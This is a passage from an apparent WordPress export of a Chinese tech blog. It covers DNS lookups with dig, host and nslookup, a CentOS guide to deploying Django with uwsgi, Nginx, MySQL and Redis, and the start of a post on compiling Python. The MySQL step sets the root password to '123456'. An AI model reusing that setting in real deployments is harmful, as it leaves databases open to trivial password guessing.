上面结果显示<code>.com</code>域名的13条NS记录，同时返回的还有每一条记录对应的IP地址。
然后，DNS服务器向这些顶级域名服务器发出查询请求，询问<code>math.stackexchange.com</code>的次级域名<code>stackexchange.com</code>的NS记录。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/03d4e15b37b9ccd69854e66529ea172c.png" alt="" />
上面结果显示<code>stackexchange.com</code>有四条NS记录，同时返回的还有每一条NS记录对应的IP地址。
然后，DNS服务器向上面这四台NS服务器查询<code>math.stackexchange.com</code>的主机名。
<img title="" src="https://www.nervgeek.com/wp-content/uploads/2016/06/9d5336abd162eb803a00a8c3deb380a1.png" alt="" />
上面结果显示，<code>math.stackexchange.com</code>有4条<code>A</code>记录，即这四个IP地址都可以访问到网站。并且还显示，最先返回结果的NS服务器是<code>ns-463.awsdns-57.com</code>，IP地址为<code>205.251.193.207</code>。
&nbsp;
<h2><span style="font-size: 24pt;">七、NS 记录的查询</span></h2>
<code>dig</code>命令可以单独查看每一级域名的NS记录。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig ns com
$ dig ns stackexchange<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
<code>+short</code>参数可以显示简化的结果。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig <span class="token operator">+</span>short ns com
$ dig <span class="token operator">+</span>short ns stackexchange<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
<h2></h2>
<h2><span style="font-size: 24pt;">八、DNS的记录类型</span></h2>
域名与IP之间的对应关系，称为"记录"（record）。根据使用场景，"记录"可以分成不同的类型（type），前面已经看到了有<code>A</code>记录和<code>NS</code>记录。
常见的DNS记录类型如下。
<blockquote>（1） <code>A</code>：地址记录（Address），返回域名指向的IP地址。
（2） <code>NS</code>：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。
（3）<code>MX</code>：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。
（4）<code>CNAME</code>：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的跳转，详见下文。
（5）<code>PTR</code>：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。</blockquote>
一般来说，为了服务的安全可靠，至少应该有两条<code>NS</code>记录，而<code>A</code>记录和<code>MX</code>记录也可以有多条，这样就提供了服务的冗余性，防止出现单点失败。
<code>CNAME</code>记录主要用于域名的内部跳转，为服务器配置提供灵活性，用户感知不到。举例来说，<code>facebook.github.io</code>这个域名就是一个<code>CNAME</code>记录。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span> ANSWER SECTION<span class="token punctuation">:</span>
facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span> <span class="token number">3370</span>    IN  CNAME   github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net<span class="token punctuation">.</span>  <span class="token number">600</span> IN  A   <span class="token number">103.245</span><span class="token punctuation">.</span><span class="token number">222.133</span>
</code></pre>
</blockquote>
上面结果显示，<code>facebook.github.io</code>的CNAME记录指向<code>github.map.fastly.net</code>。也就是说，用户查询<code>facebook.github.io</code>的时候，实际上返回的是<code>github.map.fastly.net</code>的IP地址。这样的好处是，变更服务器IP地址的时候，只要修改<code>github.map.fastly.net</code>这个域名就可以了，用户的<code>facebook.github.io</code>域名不用修改。
由于<code>CNAME</code>记录就是一个替换，所以域名一旦设置<code>CNAME</code>记录以后，就不能再设置其他记录了（比如<code>A</code>记录和<code>MX</code>记录），这是为了防止产生冲突。举例来说，<code>foo.com</code>指向<code>bar.com</code>，而两个域名各有自己的<code>MX</code>记录，如果两者不一致，就会产生问题。由于顶级域名通常要设置<code>MX</code>记录，所以一般不允许用户对顶级域名设置<code>CNAME</code>记录。
<code>PTR</code>记录用于从IP地址反查域名。<code>dig</code>命令的<code>-x</code>参数用于查询<code>PTR</code>记录。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig <span class="token operator">-</span>x <span class="token number">192.30</span><span class="token punctuation">.</span><span class="token number">252.153</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">;</span><span class="token punctuation">;</span> ANSWER SECTION<span class="token punctuation">:</span>
<span class="token number">153.252</span><span class="token punctuation">.</span><span class="token number">30.192</span><span class="token punctuation">.</span><span class="token keyword">in</span><span class="token operator">-</span>addr<span class="token punctuation">.</span>arpa<span class="token punctuation">.</span> <span class="token number">3600</span> IN    PTR pages<span class="token punctuation">.</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>
</code></pre>
</blockquote>
上面结果显示，<code>192.30.252.153</code>这台服务器的域名是<code>pages.github.com</code>。
逆向查询的一个应用，是可以防止垃圾邮件，即验证发送邮件的IP地址，是否真的有它所声称的域名。
<code>dig</code>命令可以查看指定的记录类型。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ dig a github<span class="token punctuation">.</span>com
$ dig ns github<span class="token punctuation">.</span>com
$ dig mx github<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
<h2></h2>
<h2><span style="font-size: 24pt;">九、其他DNS工具</span></h2>
除了<code>dig</code>，还有一些其他小工具也可以使用。
<strong>（1）host 命令</strong>
<code>host</code>命令可以看作<code>dig</code>命令的简化版本，返回当前请求域名的各种记录。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ host github<span class="token punctuation">.</span>com
github<span class="token punctuation">.</span>com has address <span class="token number">192.30</span><span class="token punctuation">.</span><span class="token number">252.121</span>
github<span class="token punctuation">.</span>com mail is handled by <span class="token number">5</span> ALT2<span class="token punctuation">.</span>ASPMX<span class="token punctuation">.</span>L<span class="token punctuation">.</span>GOOGLE<span class="token punctuation">.</span>COM<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>com mail is handled by <span class="token number">10</span> ALT4<span class="token punctuation">.</span>ASPMX<span class="token punctuation">.</span>L<span class="token punctuation">.</span>GOOGLE<span class="token punctuation">.</span>COM<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>com mail is handled by <span class="token number">10</span> ALT3<span class="token punctuation">.</span>ASPMX<span class="token punctuation">.</span>L<span class="token punctuation">.</span>GOOGLE<span class="token punctuation">.</span>COM<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>com mail is handled by <span class="token number">5</span> ALT1<span class="token punctuation">.</span>ASPMX<span class="token punctuation">.</span>L<span class="token punctuation">.</span>GOOGLE<span class="token punctuation">.</span>COM<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>com mail is handled by <span class="token number">1</span> ASPMX<span class="token punctuation">.</span>L<span class="token punctuation">.</span>GOOGLE<span class="token punctuation">.</span>COM<span class="token punctuation">.</span>
$ host facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>com
facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>com is an alias <span class="token keyword">for</span> github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net<span class="token punctuation">.</span>
github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net has address <span class="token number">103.245</span><span class="token punctuation">.</span><span class="token number">222.133</span>
</code></pre>
</blockquote>
<code>host</code>命令也可以用于逆向查询，即从IP地址查询域名，等同于<code>dig -x &lt;ip&gt;</code>。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ host <span class="token number">192.30</span><span class="token punctuation">.</span><span class="token number">252.153</span>
<span class="token number">153.252</span><span class="token punctuation">.</span><span class="token number">30.192</span><span class="token punctuation">.</span><span class="token keyword">in</span><span class="token operator">-</span>addr<span class="token punctuation">.</span>arpa domain name pointer pages<span class="token punctuation">.</span>github<span class="token punctuation">.</span>com<span class="token punctuation">.</span>
</code></pre>
</blockquote>
<strong>（2）nslookup 命令</strong>
<code>nslookup</code>命令用于互动式地查询域名记录。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ nslookup
<span class="token operator">&gt;</span> facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io
Server<span class="token punctuation">:</span>     <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.253</span>
Address<span class="token punctuation">:</span>    <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.253</span><span class="token comment" spellcheck="true">#53
</span>
Non<span class="token operator">-</span>authoritative answer<span class="token punctuation">:</span>
facebook<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io  canonical name <span class="token operator">=</span> github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net<span class="token punctuation">.</span>
Name<span class="token punctuation">:</span>   github<span class="token punctuation">.</span>map<span class="token punctuation">.</span>fastly<span class="token punctuation">.</span>net
Address<span class="token punctuation">:</span> <span class="token number">103.245</span><span class="token punctuation">.</span><span class="token number">222.133</span>
<span class="token operator">&gt;</span>
</code></pre>
</blockquote>
<strong>（3）whois 命令</strong>
<code>whois</code>命令用来查看域名的注册情况。
<blockquote>
<pre class=" language-bash"><code class=" language-bash">
$ whois github<span class="token punctuation">.</span>com
</code></pre>
</blockquote>
<h1></h1>
<h1><span style="font-size: 24pt;">十、参考链接</span></h1>
<ul>
    <li><a href="https://www.petekeen.net/dns-the-good-parts" target="_blank">DNS: The Good Parts</a>, by Pete Keen</li>
    <li><a href="http://www.integralist.co.uk/posts/dnsbasics.html" target="_blank">DNS 101</a>, by Mark McDonnell</li>
</ul>
</div>

<blockquote><span style="font-size: 14pt;">来源：阮一峰的网络日志</span>
<span style="font-size: 14pt;">原文：<a href="http://www.ruanyifeng.com/blog/2016/06/dns.html">http://www.ruanyifeng.com/blog/2016/06/dns.html</a></span></blockquote>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1347</wp:post_id>
		<wp:post_date><![CDATA[2016-06-18 10:41:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-18 02:41:54]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[dns%e5%8e%9f%e7%90%86%e5%85%a5%e9%97%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="dns"><![CDATA[DNS]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[166]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>在CentOS6.4部署django环境(python+nginx+uwsgi+mysql)(另外再加一个Redis和Redis-py的配置)</title>
		<link>https://www.nervgeek.com/2016/06/24/%e5%9c%a8centos6-4%e9%83%a8%e7%bd%b2django%e7%8e%af%e5%a2%83pythonnginxuwsgimysql/</link>
		<pubDate>Fri, 24 Jun 2016 12:20:27 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1368</guid>
		<description></description>
		<content:encoded><![CDATA[最近想学学python web，虽然Windows也能部署开发环境，但Linux还是主流，所以直接在Linux上部署环境学习python了。
&nbsp;
<strong><span style="font-size: 24pt;">0x01  事先准备</span></strong>
CentOS6.4自带2.6版本的python，我们需要升级到2.7.11版本，但升级之前，我们安装一些东西。当然已经安装好了可以无视。
安装<strong>gcc</strong>：

<pre>yum install -y gcc</pre>

&nbsp;
安装<strong>zlib</strong>、<strong>zlib-devel</strong>(不安装可能导致安装setuptools报错，虽可以报错后再安装，但还需要再次安装python才能正常运行，避免后面出错建议还是事先安装)：

<pre>yum install -y zlib
yum install -y zlib-devel</pre>

&nbsp;
安装<strong>openssl</strong>、<strong>openssl-devel</strong>(不安装可能导致pip运行报错，理由同上)：

<pre>yum install openssl openssl-devel -y</pre>

&nbsp;
安装<strong>sqlite-devel</strong>(不安装可能导致运行django站点报错，理由同上)：

<pre>yum install -y sqlite-devel</pre>

&nbsp;
在菜鸟网看到这个命令，也是能解决后面出现的一些问题：

<pre>yum groupinstall "Development tools"
yum install zlib-devel bzip2-devel pcre-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel</pre>

这些包都是有可能会缺失的包。
<!--more-->

<hr />

&nbsp;
<strong><span style="font-size: 24pt;">0x02  安装(更新)python</span></strong>
使用<strong>wget</strong>下载python 2.7.11源码包，解压，进入解压后的文件夹：

<pre>wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz
tar -zxvf Python-2.7.11.tgz
cd Python-2.7.11</pre>

执行<strong>./configure</strong>、<strong>make all</strong>、<strong>make install</strong>、<strong>make clean</strong>、<strong>make distclean</strong>一系列操作：

<pre>./configure
make all/*执行完耐心等待*/
make install/*执行完耐心等待*/
make clean
make distclean</pre>

安装完毕，输入python进入python环境，即可看见版本号已升级为2.7.11。
&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>0x03  安装setuptools</strong></span>
setuptools是Python distutils增强版的集合，它可以帮助我们更简单的创建和分发Python包，尤其是拥有依赖关系的。用户在使用setuptools创建的包时，并不需要已安装setuptools，只要一个启动模块即可。
源码下载网站：https://pypi.python.org/pypi/setuptools
使用<strong>wget</strong>下载<a href="https://pypi.python.org/packages/45/5e/79ca67a0d6f2f42bfdd9e467ef97398d6ad87ee2fa9c8cdf7caf3ddcab1e/setuptools-23.0.0.tar.gz#md5=100a90664040f8ff232fbac02a4c5652">setuptools-23.0.0.tar.gz</a>(目前最新版是23)，解压，进入<strong>setuptools</strong>目录：

<pre>wget https://pypi.python.org/packages/45/5e/79ca67a0d6f2f42bfdd9e467ef97398d6ad87ee2fa9c8cdf7caf3ddcab1e/setuptools-23.0.0.tar.gz
tar -zxvf setuptools-23.0.0.tar.gz
cd setuptools-23.0.0</pre>

执行安装：

<pre>python setup.py install</pre>

安装成功执行<code>easy_install --version</code>，成功返回版本号即可。
&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>0x04  安装pip</strong></span>
pip是一个安装和管理 Python 包的工具 ,是easy_install的替代品。为了练手，也把他安装上去。
源码下载网站：https://pypi.python.org/pypi/pip#downloads
使用<strong>wget</strong>下载<a href="https://pypi.python.org/packages/e7/a8/7556133689add8d1a54c0b14aeff0acb03c64707ce100ecd53934da1aa13/pip-8.1.2.tar.gz#md5=87083c0b9867963b29f7aba3613e8f4a">pip-8.1.2.tar.gz</a>(目前最新版是8.1.2)，解压，进入<strong>pip</strong>目录：

<pre>wget https://pypi.python.org/packages/e7/a8/7556133689add8d1a54c0b14aeff0acb03c64707ce100ecd53934da1aa13/pip-8.1.2.tar.gz
tar -zxvf pip-8.1.2.tar.gz
cd pip-8.1.2.tar.gz</pre>

执行安装：

<pre>python setup.py build
python setup.py install</pre>

安装成功执行<code>pip --version</code>，成功返回版本号即可。
&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>0x05  安装django</strong></span>
我们既然都安装了pip和setuptools，你可以使用下面其中一个安装命令来安装：
pip：

<pre>pip install django</pre>

setuptools：

<pre>easy_install django</pre>

执行后静待片刻，下载需要一定时间。
下载安装完成后，进入python测试：

<pre>[root@localhost ~]# python
Python 2.7.11 (default, Jun 25 2016, 03:06:20)
[GCC 4.4.7 20120313 (Red Hat 4.4.7-17)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>&gt;&gt; import django
>&gt;&gt; django.VERSION
(1, 10, 0, u'beta', 1)
>&gt;&gt;</pre>

成功返回版本号。
<strong><span style="font-size: 18pt;">创建 Django 项目测试</span></strong>
进入站点目录(python的站点和普通php的不一样，不需要固定在wwwroot等目录，可以在随处建立自己的站点，本次实验我设定自己的站点路径为/home/www/)，执行命令新建项目：

<pre>django-admin.py startproject djangoweb</pre>

完整目录路径为：<code>/home/www/djangoweb</code>
树形图：

<pre>home
└── www
 └── djangoweb
  ├── db.sqlite3
  ├── djangoweb
  │   ├── __init__.py
  │   ├── __init__.pyc
  │   ├── settings.py
  │   ├── settings.pyc
  │   ├── urls.py
  │   ├── urls.pyc
  │   ├── wsgi.py
  │   └── wsgi.pyc
  └── manage.py</pre>

&nbsp;
启动服务：

<pre>cd djangoweb # 切换到我们创建的项目
$ python manage.py runserver //默认运行在http://127.0.0.1:8000/，只能本机浏览
……
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.
或
$ python manage.py runserver http://ip:端口号
……
Starting development server at http://ip:端口号
Quit the server with CONTROL-C.</pre>

如出现类似以下报错：

<pre>You have 13 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions.
Run 'python manage.py migrate' to apply them.</pre>

只需执行<code>python manage.py migrate</code>即可。
成功运行后可以在浏览器查看项目：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/F_BJWOBXSHVK3F26IXF.png"><img class="alignnone size-full wp-image-1375" src="https://www.nervgeek.com/wp-content/uploads/2016/06/F_BJWOBXSHVK3F26IXF.png" alt="F_BJWOBXSHVK(3[F[26$IXF" width="2074" height="1225" /></a>
&nbsp;

<hr />

&nbsp;

<h2><span style="font-size: 24pt;"><strong>0x06  </strong>安装uwsgi</span></h2>

uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。
安装<strong>uwsgi</strong>：

<pre>pip install uwsgi</pre>

测试：

<pre>uwsgi --version</pre>

如返回版本号即成功安装。
测试是否能正常运作：
新建一个<strong>test.py</strong>：

<pre>def application(env, start_response):
    start_response('200 OK', [('Content-Type','text/html')])
    return "Hello World"</pre>

运行<strong>uwsgi</strong>：

<pre>uwsgi --http ip:8001 --wsgi-file test.py</pre>

在浏览器输入http://ip:8001能看到Hello World即代表正常运行。
&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>0x07  安装Nginx</strong></span>
Nginx想必大家都非常熟悉，在此就不在介绍。
源码下载地址：<a href="http://nginx.org/download/">http://nginx.org/download/</a>
我使用最新版本1.9.9，用wget下载，解压，进入解压后的文件夹：

<pre>wget http://nginx.org/download/nginx-1.9.9.tar.gz
tar -zxvf nginx-1.9.9.tar.gz
cd nginx-1.9.9</pre>

&nbsp;
编译安装(更多编译参数请浏览<a href="http://www.jb51.net/article/49479.htm">http://www.jb51.net/article/49479.htm</a>)：

<pre> ./configure --prefix=/usr/local/nginx-1.9.9 --with-http_ssl_module --with-http_spdy_module --with-http_stub_status_module --with-pcre
make
make install</pre>

&nbsp;
安装路径是/usr/local/nginx-1.9.9，启动在/usr/local/nginx-1.9.9/sbin/nginx。

<pre>进入/usr/local/nginx-1.9.9/sbin/，重载配置文件：
./nginx -s reload
关闭服务器：
./nginx -s stop
启动服务器：
./nginx</pre>

&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt; background-color: #ffffff;"><strong>0x08  uwsgi+Nginx配置</strong></span>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/Nginx-uwsgi-django-2.png"><img class="alignnone size-full wp-image-1380" src="https://www.nervgeek.com/wp-content/uploads/2016/06/Nginx-uwsgi-django-2.png" alt="Nginx uwsgi django (2)" width="609" height="150" /></a>
在这个体系中，uwsgi的9090端口不是面向服务器外部的，只是系统内部的服务端口，Nginx就是通过9090端口和uwsgi交互（9090只是我个人设定的，可随意设定）。普通用户通过80端口访问到Nginx，静态等交给Nginx处理，其余都转给了uwsgi处理，最后通过Nginx返回到浏览器。
<strong><span style="font-size: 18pt;">配置Nginx：</span></strong>
配置文件在安装目录下的conf/nginx.conf，根据我上面的安装路径，配置文件路径为：<code>/usr/local/nginx-1.9.9/conf/nginx.conf</code>
在Server内对location进行配置：

<pre>location / {
    include uwsgi_params;
    uwsgi_pass 127.0.0.1:9090;
}</pre>

uwsgi_pass表示uwsgi服务端口为本地的9090端口，重新加载配置文件。

<pre>进入/usr/local/nginx-1.9.9/sbin/，重载配置文件：
./nginx -s reload</pre>

没报错则成功，如有no found……等报错，尝试指定配置文件加载：

<pre>/usr/local/nginx-1.9.9/sbin/nginx -c /usr/local/nginx-1.9.9/conf/nginx.conf</pre>

&nbsp;
<strong><span style="font-size: 18pt;">配置uwsgi：</span></strong>
uwsgi无默认的配置文件，需要自己创建，可以在任何地方创建，便于管理我创建在<strong>/etc</strong>目录下：<code>touch uwsgi9090.ini</code>
uwsgi可支持ini和xml格式的配置文件，不知道我为什么使用-x参数会报错，别人说缺失libxml等依赖库，但还是不行...所以我使用ini格式的配置文件。

<pre>[uwsgi]
socket = 127.0.0.1:9090
chdir = /home/www/djangoweb/
wsgi-file = djangoweb/wsgi.py
master = true
workers = 2
reload-mercy = 10
vacuum = true
max-requests = 1000
limit-as = 512
buffer-size = 30000</pre>

配置文件是从网上复制下来使用的，可正常使用，由于第一次用，不是很懂其他参数...
<strong>socket</strong>代表uwsgi的端口，<strong>chdir</strong>指向django的站点，<strong>wsgi-file</strong>的djangoweb/wsgi.py要和<strong>chdir</strong>结合一起来看，其代表的目录就是<code>/home/www/djangoweb/djangoweb/wsgi.py</code>，<strong>worker</strong>表示进程数。
&nbsp;
<strong><span style="font-size: 18pt;">运行测试：</span></strong>
全部配置完成后，启动nginx，执行命令：

<pre>uwsgi --ini /etc/uwsgi9090.ini</pre>

浏览器只需要访问http://ip即可，因为nginx默认端口就是80。
如显示<strong>It worked!</strong>页面即代表正常运行。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/06/YQ16A6AONPEREXBW3.png"><img class="alignnone size-full wp-image-1382" src="https://www.nervgeek.com/wp-content/uploads/2016/06/YQ16A6AONPEREXBW3.png" alt="%YQ1)}6A6AONPE{R&#96;EXB)W3" width="1792" height="1038" /></a>
&nbsp;

<hr />

&nbsp;
&nbsp;
<span style="font-size: 24pt;"><strong>0x09  安装MySQL</strong></span>
MySQL的安装非常简单快捷，当然可以从官网上下载最新的源码包进行编译安装。
使用yum安装：

<pre>yum install -y mysql-server mysql mysql-devel</pre>

启动mysql服务，加入开机启动：

<pre>service mysqld start
chkconfig mysqld on</pre>

设置MySQL的密码：

<pre>/usr/bin/mysqladmin -u root password '123456'</pre>

登陆验证：

<pre>mysql -u root -p
Enter password: (输入123456)
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.1.73 Source distribution
Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql&gt;</pre>

成功！
&nbsp;

<hr />

&nbsp;
<span style="font-size: 24pt;"><strong>0x10  安装Redis并配置Redis-py</strong></span>
Redis我是打算当成一个轻量队列使用，之前在LNMP的时候也搭建过，但单独安装Redis并没有写成教程，现在补充一下。
第一次在Python使用Redis，我看pip上的Redis-py只有2.8.10，那我们也安装Redis的2.8.10版本。
<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a>从里面找到2.8.10的下载地址，使用wget下载，解压，进入解压后的文件夹。

<pre>wget http://download.redis.io/releases/redis-2.8.10.tar.gz
tar -zxvf redis-2.8.10.tar.gz
cd redis-2.8.10</pre>

执行<code>make test</code>，如有报错可参考这篇文章：<a href="http://www.cnblogs.com/haoxinyue/p/3620648.html">http://www.cnblogs.com/haoxinyue/p/3620648.html</a>，大部分人的报错都是缺少安装tcl，执行<code>yum install -y tcl</code>即可。
make test无报错之后再执行make，编译成功后有个src文件夹，里面有redis-server、redis-cli等脚本。
Redis的三种启动方式可以参考这篇文章：<a href="http://www.tuicool.com/articles/aQbQ3u">http://www.tuicool.com/articles/aQbQ3u</a>，我直接修改redis.conf：

<pre class="prettyprint perl">daemonize no
改成
daemonize yes</pre>

可以把默认启动变成后台运行。记得启动要加上redis.conf，完整命令为：

<pre>./redis-server ../redis.conf</pre>

<strong>然后安装Redis-py，执行pip install redis即可。</strong>
进入python环境测试：

<pre>&gt;&gt;&gt; import redis
>&gt;&gt; r = redis.StrictRedis(host='localhost', port=6379, db=0)
>&gt;&gt; r.set('foo', 'bar')
True
>&gt;&gt; r.get('foo')
'bar'</pre>

成功！
/**未完待续*/]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1368</wp:post_id>
		<wp:post_date><![CDATA[2016-06-24 20:20:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-06-24 12:20:27]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9c%a8centos6-4%e9%83%a8%e7%bd%b2django%e7%8e%af%e5%a2%83pythonnginxuwsgimysql]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="centos"><![CDATA[CentOS]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="mysql"><![CDATA[MySQL]]></category>
		<category domain="post_tag" nicename="nginx"><![CDATA[nginx]]></category>
		<category domain="post_tag" nicename="pip"><![CDATA[pip]]></category>
		<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="post_tag" nicename="setuptools"><![CDATA[setuptools]]></category>
		<category domain="post_tag" nicename="uwgsi"><![CDATA[uwgsi]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[287]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_87a6e1791374975c15e1c78c971304ee]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_17b5a4f2350a332ff158d1c59650af3c]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>编译Python脚本</title>
		<link>https://www.nervgeek.com/2016/07/28/%e7%bc%96%e8%af%91python%e8%84%9a%e6%9c%ac/</link>
		<pubDate>Thu, 28 Jul 2016 06:26:26 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1392</guid>
		<description></description>
		<content:encoded><![CDATA[Python可以以用解释器执行，也可以编译之后再执行，当然编译之后的效率会大大提高。
编译之后的格式为<code>.pyc</code>。
